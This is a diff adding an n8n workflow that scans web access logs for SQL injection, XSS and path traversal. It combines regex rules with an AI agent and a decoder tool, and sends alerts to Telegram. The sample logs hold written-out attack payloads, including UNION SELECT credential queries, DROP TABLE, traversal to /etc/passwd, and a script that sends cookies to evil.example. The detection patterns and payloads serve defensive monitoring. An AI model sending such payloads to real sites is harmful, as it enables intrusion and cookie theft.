@@ -1,0 +1,364 @@
+{
+  "name": "NGP-046 Web Log Attack Hunter",
+  "nodes": [
+    {
+      "parameters": {},
+      "id": "0b3c4a92-242d-449d-a74e-aba1499fcf93",
+      "name": "Manual Trigger",
+      "type": "n8n-nodes-base.manualTrigger",
+      "typeVersion": 1,
+      "position": [
+        464,
+        208
+      ]
+    },
+    {
+      "parameters": {
+        "jsCode": "// Paste / replace with your own 30+ lines of access logs (Apache combined format)\nconst logs = String.raw`49.37.12.8 - - [14/Oct/2026:10:15:01 +0530] \"GET /index.html HTTP/1.1\" 200 5120 \"-\" \"Mozilla/5.0 (Windows NT 10.0)\"\n49.37.12.8 - - [14/Oct/2026:10:15:02 +0530] \"GET /static/css/main.css HTTP/1.1\" 200 2210 \"-\" \"Mozilla/5.0 (Windows NT 10.0)\"\n103.21.58.4 - - [14/Oct/2026:10:15:09 +0530] \"GET /products?id=12 HTTP/1.1\" 200 3320 \"-\" \"Mozilla/5.0 (Linux; Android 13)\"\n185.220.101.4 - - [14/Oct/2026:10:15:14 +0530] \"GET /products?id=12'%20OR%20'1'='1 HTTP/1.1\" 200 9841 \"-\" \"sqlmap/1.7\"\n117.200.4.19 - - [14/Oct/2026:10:15:20 +0530] \"POST /login HTTP/1.1\" 302 0 \"-\" \"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0)\"\n185.220.101.4 - - [14/Oct/2026:10:15:22 +0530] \"GET /products?id=12%20UNION%20SELECT%20username,password%20FROM%20users-- HTTP/1.1\" 500 612 \"-\" \"sqlmap/1.7\"\n59.92.33.71 - - [14/Oct/2026:10:15:31 +0530] \"GET /about HTTP/1.1\" 200 4100 \"-\" \"Mozilla/5.0 (Macintosh)\"\n45.155.205.9 - - [14/Oct/2026:10:15:35 +0530] \"GET /search?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1\" 200 4470 \"-\" \"Mozilla/5.0 (X11; Linux x86_64)\"\n157.45.9.200 - - [14/Oct/2026:10:15:40 +0530] \"GET /search?q=blue+shoes HTTP/1.1\" 200 6120 \"-\" \"Mozilla/5.0 (Linux; Android 12)\"\n91.240.118.7 - - [14/Oct/2026:10:15:44 +0530] \"GET /download?file=../../../../etc/passwd HTTP/1.1\" 403 199 \"-\" \"curl/8.4.0\"\n103.21.58.4 - - [14/Oct/2026:10:15:49 +0530] \"GET /products?category=books&page=2 HTTP/1.1\" 200 7010 \"-\" \"Mozilla/5.0 (Linux; Android 13)\"\n185.220.101.4 - - [14/Oct/2026:10:15:53 +0530] \"GET /products?id=12;%20DROP%20TABLE%20users-- HTTP/1.1\" 500 612 \"-\" \"sqlmap/1.7\"\n49.37.12.8 - - [14/Oct/2026:10:15:58 +0530] \"GET /api/v1/cart HTTP/1.1\" 200 880 \"-\" \"Mozilla/5.0 (Windows NT 10.0)\"\n45.155.205.9 - - [14/Oct/2026:10:16:03 +0530] \"GET /search?q=%3Cimg%20src=x%20onerror=alert(document.cookie)%3E HTTP/1.1\" 200 4470 \"-\" \"Mozilla/5.0 (X11; Linux x86_64)\"\n117.200.4.19 - - [14/Oct/2026:10:16:08 +0530] \"GET /dashboard HTTP/1.1\" 200 8890 \"-\" \"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0)\"\n91.240.118.7 - - [14/Oct/2026:10:16:12 +0530] \"GET /download?file=..%2f..%2f..%2fetc%2fpasswd HTTP/1.1\" 403 199 \"-\" \"curl/8.4.0\"\n59.92.33.71 - - [14/Oct/2026:10:16:17 +0530] \"GET /contact HTTP/1.1\" 200 3900 \"-\" \"Mozilla/5.0 (Macintosh)\"\n103.77.192.15 - - [14/Oct/2026:10:16:21 +0530] \"POST /login?user=admin'-- HTTP/1.1\" 200 1500 \"-\" \"python-requests/2.31\"\n157.45.9.200 - - [14/Oct/2026:10:16:26 +0530] \"GET /images/logo.png HTTP/1.1\" 304 0 \"-\" \"Mozilla/5.0 (Linux; Android 12)\"\n185.220.101.4 - - [14/Oct/2026:10:16:30 +0530] \"GET /products?id=1%20AND%20SLEEP(5) HTTP/1.1\" 200 3320 \"-\" \"sqlmap/1.7\"\n103.21.58.4 - - [14/Oct/2026:10:16:35 +0530] \"POST /api/v1/checkout HTTP/1.1\" 201 410 \"-\" \"Mozilla/5.0 (Linux; Android 13)\"\n45.155.205.9 - - [14/Oct/2026:10:16:39 +0530] \"GET /comment?text=%3Csvg%20onload=alert(1)%3E HTTP/1.1\" 200 2200 \"-\" \"Mozilla/5.0 (X11; Linux x86_64)\"\n49.37.12.8 - - [14/Oct/2026:10:16:44 +0530] \"GET /blog/2026/10/welcome HTTP/1.1\" 200 9100 \"-\" \"Mozilla/5.0 (Windows NT 10.0)\"\n91.240.118.7 - - [14/Oct/2026:10:16:48 +0530] \"GET /static/..%2f..%2fconfig/.env HTTP/1.1\" 404 150 \"-\" \"curl/8.4.0\"\n117.200.4.19 - - [14/Oct/2026:10:16:53 +0530] \"GET /favicon.ico HTTP/1.1\" 200 1150 \"-\" \"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0)\"\n103.77.192.15 - - [14/Oct/2026:10:16:57 +0530] \"GET /search?q=1%27%20OR%201=1 HTTP/1.1\" 200 6120 \"-\" \"python-requests/2.31\"\n185.220.101.4 - - [14/Oct/2026:10:17:02 +0530] \"GET /products?id=1%20UNION%20SELECT%20table_name%20FROM%20information_schema.tables HTTP/1.1\" 500 612 \"-\" \"sqlmap/1.7\"\n59.92.33.71 - - [14/Oct/2026:10:17:06 +0530] \"GET /search?q=laptop+bag HTTP/1.1\" 200 6000 \"-\" \"Mozilla/5.0 (Macintosh)\"\n45.155.205.9 - - [14/Oct/2026:10:17:11 +0530] \"GET /redirect?url=javascript:alert(1) HTTP/1.1\" 302 0 \"-\" \"Mozilla/5.0 (X11; Linux x86_64)\"\n157.45.9.200 - - [14/Oct/2026:10:17:15 +0530] \"GET /faq HTTP/1.1\" 200 3300 \"-\" \"Mozilla/5.0 (Linux; Android 12)\"\n91.240.118.7 - - [14/Oct/2026:10:17:20 +0530] \"GET /download?file=%2e%2e%2f%2e%2e%2fwindows%2fwin.ini HTTP/1.1\" 403 199 \"-\" \"curl/8.4.0\"\n103.77.192.15 - - [14/Oct/2026:10:17:24 +0530] \"GET /profile?name=%3Cscript%3Efetch('//evil.example/c?'+document.cookie)%3C/script%3E HTTP/1.1\" 200 3100 \"-\" \"python-requests/2.31\"\n194.26.29.50 - - [14/Oct/2026:10:17:29 +0530] \"GET /api/v1/users?id=5%20OR%201=1 HTTP/1.1\" 200 2048 \"-\" \"Go-http-client/1.1\"\n103.21.58.4 - - [14/Oct/2026:10:17:33 +0530] \"GET /products?id=45 HTTP/1.1\" 200 3320 \"-\" \"Mozilla/5.0 (Linux; Android 13)\"\n194.26.29.50 - - [14/Oct/2026:10:17:38 +0530] \"GET /view?page=....//....//etc/passwd HTTP/1.1\" 403 199 \"-\" \"Go-http-client/1.1\"\n117.200.4.19 - - [14/Oct/2026:10:17:42 +0530] \"POST /logout HTTP/1.1\" 302 0 \"-\" \"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0)\"`;\nreturn [{ json: { logs } }];"
+      },
+      "id": "62fafc70-af37-4ded-b6c8-444a37f306b1",
+      "name": "Sample Logs (paste here)",
+      "type": "n8n-nodes-base.code",
+      "typeVersion": 2,
+      "position": [
+        736,
+        272
+      ]
+    },
+    {
+      "parameters": {
+        "jsCode": "const logs = $input.first().json.logs;\nconst lines = logs.split(/\\r?\\n/).map(l => l.trim()).filter(Boolean);\n\nconst LINE_RE = /^(\\S+) \\S+ \\S+ \\[([^\\]]+)\\] \"(\\S+) (\\S+) [^\"]*\" (\\d{3}) (\\S+)/;\nconst RULES = {\n  SQLi: /(\\bunion\\b\\s+(all\\s+)?select\\b|\\bor\\b\\s+\\d+=\\d+|'\\s*or\\s*'|'\\s*(--|#)|;\\s*drop\\s+table|\\bsleep\\s*\\(|information_schema|\\bselect\\b.+\\bfrom\\b)/i,\n  XSS: /(<\\s*script|<\\s*svg|<\\s*img[^>]+on\\w+\\s*=|\\bon(error|load|click|mouseover)\\s*=|javascript:)/i,\n  PathTraversal: /(\\.\\.\\/|\\.\\.\\\\|\\.\\.%5c|\\/etc\\/passwd|\\bwin\\.ini|\\bboot\\.ini)/i\n};\n\nfunction decode(s) {\n  let x = s;\n  for (let i = 0; i < 3; i++) {\n    try {\n      const d = decodeURIComponent(x.replace(/\\+/g, ' '));\n      if (d === x) break;\n      x = d;\n    } catch (e) { break; }\n  }\n  return x;\n}\n\nconst counts = { SQLi: 0, XSS: 0, PathTraversal: 0 };\nconst ipHits = {};\nconst suspicious = [];\nlet parsed = 0;\n\nfor (const line of lines) {\n  const m = LINE_RE.exec(line);\n  if (!m) continue;\n  parsed++;\n  const [, ip, , method, path, status] = m;\n  const decoded = decode(path);\n  const tags = Object.keys(RULES).filter(k => RULES[k].test(path) || RULES[k].test(decoded));\n  if (!tags.length) continue;\n  tags.forEach(t => counts[t]++);\n  ipHits[ip] = (ipHits[ip] || 0) + 1;\n  suspicious.push({ ip, method, status, request: path.slice(0, 200), tags });\n}\n\nconst top_ips = Object.entries(ipHits)\n  .sort((a, b) => b[1] - a[1])\n  .slice(0, 4)\n  .map(([ip, hits]) => ({ ip, hits }));\n\nconst agent_prompt =\n`Web access log scan results (regex pre-tagging).\nTotal lines: ${lines.length}, parsed: ${parsed}, suspicious: ${suspicious.length}\nRegex counts: ${JSON.stringify(counts)}\nTop offending IPs: ${JSON.stringify(top_ips)}\nSuspicious requests (max 20):\n${JSON.stringify(suspicious.slice(0, 20), null, 1)}\n\nTasks: (1) call the payload_decoder tool on at least one request per attack type, (2) confirm which attack types are REAL attacks vs false positives, (3) rate overall severity. Reply with the JSON only.`;\n\nreturn [{ json: { total_lines: lines.length, parsed, suspicious_count: suspicious.length, counts, top_ips, suspicious, agent_prompt } }];"
+      },
+      "id": "4c259796-f2dc-4123-90c2-76086843819b",
+      "name": "Regex Tagger",
+      "type": "n8n-nodes-base.code",
+      "typeVersion": 2,
+      "position": [
+        736,
+        80
+      ]
+    },
+    {
+      "parameters": {
+        "promptType": "define",
+        "text": "={{ $json.agent_prompt }}",
+        "options": {
+          "systemMessage": "You are a SOC detection engineer reviewing web access logs that a regex pre-filter has tagged.\nRULES:\n1. You MUST call the `payload_decoder` tool at least once (ideally once per attack type) with the raw request string, before answering.\n2. Use the tool output (decoded payload, indicators) to confirm the attack type and decide whether it is a real attack or a false positive.\n3. Reply with ONLY one JSON object, no markdown, no extra text:\n{\"verdict\":\"Confirmed Attack | Suspicious | Benign\",\"severity\":\"Low | Medium | High | Critical\",\"attack_types\":[\"SQLi\",\"XSS\",\"PathTraversal\"],\"summary\":\"one line, max 140 characters\"}\nAllowed verdict: Confirmed Attack, Suspicious, Benign. Allowed severity: Low, Medium, High, Critical. Allowed attack_types: SQLi, XSS, PathTraversal. The summary must be a single line of at most 140 characters.",
+          "maxIterations": 6
+        }
+      },
+      "id": "024c7a37-8757-412e-a0c8-2390dedc4e11",
+      "name": "AI Agent",
+      "type": "@n8n/n8n-nodes-langchain.agent",
+      "typeVersion": 1.7,
+      "position": [
+        992,
+        80
+      ],
+      "retryOnFail": true,
+      "maxTries": 4,
+      "waitBetweenTries": 10000
+    },
+    {
+      "parameters": {
+        "modelName": "models/gemini-3.1-flash-lite",
+        "options": {}
+      },
+      "id": "30b41ac9-7d81-47c0-8665-e38cb3a18579",
+      "name": "Google Gemini Chat Model",
+      "type": "@n8n/n8n-nodes-langchain.lmChatGoogleGemini",
+      "typeVersion": 1.2,
+      "position": [
+        992,
+        352
+      ]
+    },
+    {
+      "parameters": {
+        "name": "payload_decoder",
+        "description": "Decodes a raw (URL-encoded / double-encoded) HTTP request path or query string and returns the decoded payload, attack indicators (SQLi, XSS, PathTraversal), obfuscation level, scanner-tool signature and a severity hint. Input: the raw request string from the log.",
+        "jsCode": "const raw = String(query || '');\nlet decoded = raw, layers = 0;\nfor (let i = 0; i < 3; i++) {\n  try {\n    const d = decodeURIComponent(decoded.replace(/\\+/g, ' '));\n    if (d === decoded) break;\n    decoded = d; layers++;\n  } catch (e) { break; }\n}\nconst ind = [];\nif (/union\\s+(all\\s+)?select|\\bor\\b\\s+\\d+=\\d+|'\\s*or\\s*'|sleep\\s*\\(|information_schema|drop\\s+table|'\\s*(--|#)/i.test(decoded)) ind.push('SQLi');\nif (/<\\s*script|<\\s*svg|onerror\\s*=|onload\\s*=|javascript:/i.test(decoded)) ind.push('XSS');\nif (/\\.\\.\\/|\\.\\.\\\\|\\/etc\\/passwd|win\\.ini/i.test(decoded)) ind.push('PathTraversal');\nconst tools = /sqlmap|nikto|curl|python-requests|go-http/i.test(raw) ? 'automated-tool-signature' : 'none';\nreturn JSON.stringify({\n  decoded_payload: decoded.slice(0, 250),\n  encoding_layers: layers,\n  obfuscated: layers > 0,\n  attack_indicators: ind,\n  tool_signature: tools,\n  severity_hint: ind.length === 0 ? 'Low' : (ind.includes('SQLi') || layers > 1) ? 'High' : 'Medium'\n});"
+      },
+      "id": "3395736e-996e-47f8-92cc-fd5872c7e504",
+      "name": "payload_decoder (Code Tool)",
+      "type": "@n8n/n8n-nodes-langchain.toolCode",
+      "typeVersion": 1.1,
+      "position": [
+        1136,
+        352
+      ]
+    },
+    {
+      "parameters": {
+        "jsCode": "// S3 - Output validation: allowed values + max length\nconst t = $('Regex Tagger').first().json;\nconst attempt = $runIndex;                       // 0 = first try, 1 = retry\nconst raw = String($input.first().json.output ?? '');\nconst VERDICTS = ['Confirmed Attack', 'Suspicious', 'Benign'];\nconst SEVERITIES = ['Low', 'Medium', 'High', 'Critical'];\nconst TYPES = ['SQLi', 'XSS', 'PathTraversal'];\nconst errors = [];\nlet data = null;\n\ntry { data = JSON.parse(raw.replace(/```json|```/gi, '').trim()); }\ncatch (e) { errors.push('reply was not valid JSON'); }\n\nif (data) {\n  if (!VERDICTS.includes(data.verdict)) errors.push('verdict not in ' + VERDICTS.join('/'));\n  if (!SEVERITIES.includes(data.severity)) errors.push('severity not in ' + SEVERITIES.join('/'));\n  if (!Array.isArray(data.attack_types) || data.attack_types.length === 0 || !data.attack_types.every(x => TYPES.includes(x)))\n    errors.push('attack_types must be a non-empty subset of ' + TYPES.join('/'));\n  if (typeof data.summary !== 'string' || !data.summary.trim()) errors.push('summary missing');\n  else {\n    if (data.summary.length > 140) errors.push('summary longer than 140 chars');\n    if (/[\\r\\n]/.test(data.summary)) errors.push('summary must be one line');\n  }\n}\n\nconst valid = errors.length === 0;\nconst agent_prompt = t.agent_prompt + (valid ? '' :\n  `\\n\\nYour previous reply was REJECTED: ${errors.join('; ')}. Call the tool again if needed and return ONLY the corrected JSON.`);\n\nreturn [{ json: { valid, attempt, errors, data, agent_prompt } }];"
+      },
+      "id": "2e38ef47-6bae-4bce-a641-f324e8c73434",
+      "name": "Validate Output (S3)",
+      "type": "n8n-nodes-base.code",
+      "typeVersion": 2,
+      "position": [
+        1344,
+        80
+      ]
+    },
+    {
+      "parameters": {
+        "conditions": {
+          "options": {
+            "caseSensitive": true,
+            "leftValue": "",
+            "typeValidation": "strict",
+            "version": 2
+          },
+          "conditions": [
+            {
+              "id": "n8",
+              "leftValue": "={{ $json.valid }}",
+              "rightValue": "",
+              "operator": {
+                "type": "boolean",
+                "operation": "true",
+                "singleValue": true
+              }
+            }
+          ],
+          "combinator": "and"
+        },
+        "options": {}
+      },
+      "id": "2dd7d101-f533-411c-80a0-896ad47a4fe6",
+      "name": "Output valid?",
+      "type": "n8n-nodes-base.if",
+      "typeVersion": 2.2,
+      "position": [
+        1584,
+        80
+      ]
+    },
+    {
+      "parameters": {
+        "jsCode": "const d = $json.data;\nconst verdictSev = `${d.verdict} / ${d.severity}`;\nconst summary = d.summary.replace(/\\s+/g, ' ').trim();\nconst t = $('Regex Tagger').first().json;\nconst ist = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata', hour12: false }) + ' IST';\nconst first = `🟣 NGP-046 | exec #${$execution.id} | ${ist} | ${verdictSev} | ${summary}`;\nconst counts = Object.entries(t.counts).map(([k, v]) => `${k}: ${v}`).join(' | ');\nconst top = t.top_ips.map((x, i) => `${i + 1}. ${x.ip} - ${x.hits} hits`).join('\\n');\nconst text = `${first}\\n\\nAttack counts: ${counts}\\nTop 4 offending IPs:\\n${top}`;\nreturn [{ json: { text } }];"
+      },
+      "id": "ba8ae8db-8b81-483b-be13-dd36f8194997",
+      "name": "Build Telegram Message",
+      "type": "n8n-nodes-base.code",
+      "typeVersion": 2,
+      "position": [
+        1808,
+        144
+      ]
+    },
+    {
+      "parameters": {
+        "chatId": "YOUR_TELEGRAM_CHAT_ID",
+        "text": "={{ $json.text }}",
+        "additionalFields": {
+          "appendAttribution": false
+        }
+      },
+      "id": "05110e7f-4707-4d37-bdc4-fea16e64accd",
+      "name": "Telegram",
+      "type": "n8n-nodes-base.telegram",
+      "typeVersion": 1.2,
+      "position": [
+        1984,
+        352
+      ]
+    },
+    {
+      "parameters": {
+        "conditions": {
+          "options": {
+            "caseSensitive": true,
+            "leftValue": "",
+            "typeValidation": "strict",
+            "version": 1
+          },
+          "conditions": [
+            {
+              "id": "n9",
+              "leftValue": "={{ $json.attempt }}",
+              "rightValue": 1,
+              "operator": {
+                "type": "number",
+                "operation": "lt"
+              }
+            }
+          ],
+          "combinator": "and"
+        },
+        "options": {}
+      },
+      "id": "e3023db1-c18d-43a5-b405-c52bd2ad70ae",
+      "name": "Retry left? (attempt < 1)",
+      "type": "n8n-nodes-base.if",
+      "typeVersion": 2.2,
+      "position": [
+        1376,
+        416
+      ]
+    },
+    {
+      "parameters": {
+        "jsCode": "const verdictSev = 'Unverified / Unrated';\nconst summary = 'AI output failed validation after 1 retry - regex-only results shown';\nconst t = $('Regex Tagger').first().json;\nconst ist = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata', hour12: false }) + ' IST';\nconst first = `🟣 NGP-046 | exec #${$execution.id} | ${ist} | ${verdictSev} | ${summary}`;\nconst counts = Object.entries(t.counts).map(([k, v]) => `${k}: ${v}`).join(' | ');\nconst top = t.top_ips.map((x, i) => `${i + 1}. ${x.ip} - ${x.hits} hits`).join('\\n');\nconst text = `${first}\\n\\nAttack counts: ${counts}\\nTop 4 offending IPs:\\n${top}`;\nreturn [{ json: { text } }];"
+      },
+      "id": "2ccdcdb5-f868-49a1-810d-05714ed0fe38",
+      "name": "Fallback Message",
+      "type": "n8n-nodes-base.code",
+      "typeVersion": 2,
+      "position": [
+        1664,
+        416
+      ]
+    }
+  ],
+  "pinData": {},
+  "connections": {
+    "Manual Trigger": {
+      "main": [
+        [
+          {
+            "node": "Sample Logs (paste here)",
+            "type": "main",
+            "index": 0
+          }
+        ]
+      ]
+    },
+    "Sample Logs (paste here)": {
+      "main": [
+        [
+          {
+            "node": "Regex Tagger",
+            "type": "main",
+            "index": 0
+          }
+        ]
+      ]
+    },
+    "Regex Tagger": {
+      "main": [
+        [
+          {
+            "node": "AI Agent",
+            "type": "main",
+            "index": 0
+          }
+        ]
+      ]
+    },
+    "AI Agent": {
+      "main": [
+        [
+          {
+            "node": "Validate Output (S3)",
+            "type": "main",
+            "index": 0
+          }
+        ]
+      ]
+    },
+    "Google Gemini Chat Model": {
+      "ai_languageModel": [
+        [
+          {
+            "node": "AI Agent",
+            "type": "ai_languageModel",
+            "index": 0
+          }
+        ]
+      ]
+    },
+    "payload_decoder (Code Tool)": {
+      "ai_tool": [
+        [
+          {
+            "node": "AI Agent",
+            "type": "ai_tool",
+            "index": 0
+          }
+        ]
+      ]
+    },
+    "Validate Output (S3)": {
+      "main": [
+        [
+          {
+            "node": "Output valid?",
+            "type": "main",
+            "index": 0
+          }
+        ]
+      ]
+    },
+    "Output valid?": {
+      "main": [
+        [
+          {
+            "node": "Build Telegram Message",
+            "type": "main",
+            "index": 0
+          }
+        ],
+        [
+          {
+            "node": "Retry left? (attempt < 1)",
+            "type": "main",
+            "index": 0
+          }
+        ]
+      ]
+    },
+    "Build Telegram Message": {
+      "main": [
+        [
+          {
+            "node": "Telegram",
+            "type": "main",
+            "index": 0
+          }
+        ]
+      ]
+    },
+    "Retry left? (attempt < 1)": {
+      "main": [
+        [
+          {
+            "node": "AI Agent",
+            "type": "main",
+            "index": 0
+          }
+        ],
+        [
+          {
+            "node": "Fallback Message",
+            "type": "main",
+            "index": 0
+          }
+        ]
+      ]
+    },
+    "Fallback Message": {
+      "main": [
+        [
+          {
+            "node": "Telegram",
+            "type": "main",
+            "index": 0
+          }
+        ]
+      ]
+    }
+  },
+  "active": false,
+  "settings": {
+    "executionOrder": "v1",
+    "binaryMode": "separate"
+  },
+  "versionId": "6dcd9e3b-4ee4-4c87-a6ed-a59a5e3967b2",
+  "meta": {
+    "templateCredsSetupCompleted": true
+  },
+  "nodeGroups": [],
+  "tags": []
+}
